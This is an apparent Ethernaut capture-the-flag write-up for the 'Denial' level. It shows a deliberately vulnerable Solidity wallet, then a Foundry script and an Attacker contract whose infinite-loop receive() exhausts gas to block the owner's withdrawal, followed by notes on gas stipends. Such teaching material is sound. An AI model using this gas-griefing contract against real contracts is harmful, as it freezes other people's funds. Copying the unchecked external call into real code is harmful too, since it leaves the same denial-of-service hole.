---
title: "Denial"
date: "2024-02-25T10:37:00.000Z"
lastmod: "2024-02-26T09:11:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Alien-Codex-d14fa389394f4031b7c2ffcdeeebeb56"
weight: 21
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/20"
next: "Shop-b6f28652a23642f2805fd50f577ea02f"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "edd8839c-e63a-4a21-94ad-fd2905ad4940"
  created_time: "2024-02-25T10:37:00.000Z"
  last_edited_time: "2024-02-26T09:11:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Alien-Codex-d14fa389394f4031b7c2ffcdeeebeb56"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Alien-Codex-d14fa389394f4031b7c2ffcdeeebeb56"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 21
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/20"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Shop-b6f28652a23642f2805fd50f577ea02f"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Shop-b6f28652a23642f2805fd50f577ea02f"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Denial"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Denial"
          href: null
  url: "https://www.notion.so/Denial-edd8839ce63a4a2194adfd2905ad4940"
  public_url: null
UPDATE_TIME: "2024-02-26T13:02:37.145Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


This is a simple wallet that drips funds over time. You can withdraw the funds
slowly by becoming a withdrawing partner.


If you can deny the owner from withdrawing funds when they call `withdraw()`
(whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,Denial} from '../src/20.sol';

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_20");

        vm.startBroadcast(deployerPrivateKey);

        new Attacker(addr);

        vm.stopBroadcast();
    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Denial {
    function setWithdrawPartner(address _partner) external;
}

contract Attacker {
  Denial denial;

  constructor(address _denial) {
    denial = Denial(_denial);
    denial.setWithdrawPartner(address(this));
  }

  // Classic DOS attack
  receive() external payable {
    uint i = 0;
    while (true) {
      i++;
    }
  }
}
```


This level demonstrates that external calls to unknown contracts can still
create denial of service attack vectors if a fixed amount of gas is not
specified.


If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.


Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)
 pattern to avoid reentrancy attacks, there can be other circumstances 
(such as multiple external calls at the end of a function) where issues 
such as this can arise.


_Note_: An external `CALL` can use at most 63/64 of the gas currently available
at the time of the `CALL`.  Thus, depending on how much gas 
is required to
complete a transaction, a transaction of sufficiently high gas (i.e. one
 such
that 1/64 of the gas is capable of completing the remaining opcodes in 
the parent call) can be used to mitigate this particular attack.

